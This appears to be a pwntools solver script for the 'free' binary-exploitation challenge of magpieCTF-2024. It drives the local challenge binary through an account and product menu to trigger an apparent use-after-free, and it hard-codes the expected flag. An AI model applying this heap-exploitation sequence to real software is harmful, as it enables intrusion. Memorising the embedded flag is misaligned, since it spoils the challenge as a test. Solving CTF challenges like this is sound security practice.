#!/usr/bin/env python3
from pwn import *

FLAG=b'magpie{f10w1ng_m0n3y_1n_fr33_bug5}'

def solve()->bool:
    context.log_level='critical'

    elf=ELF("/home/arch/infosec/club/magpieCTF-2024/challenges/binary-exploitation/free/src/chal")
    p=elf.process()

    #create account
    p.recv()
    p.sendline(b'3')

    #purchase product
    p.recv()
    p.sendline(b'4')
    p.recv()
    p.sendline(b'0')
    p.recv()
    p.sendline(b'1')
    p.recv()
    p.sendline(b'6700417')
    p.recv()

    #remove product
    p.sendline(b'8')
    p.recv()
    p.sendline(b'1')
    p.recv()

    #create another account
    p.sendline(b'3')
    p.recv()
    
    #exploit (aka see review)
    p.recv()
    p.sendline(b'6')
    p.recv()
    p.sendline(b'1')
    return FLAG in p.recv()

if __name__=="__main__":
    print(solve())
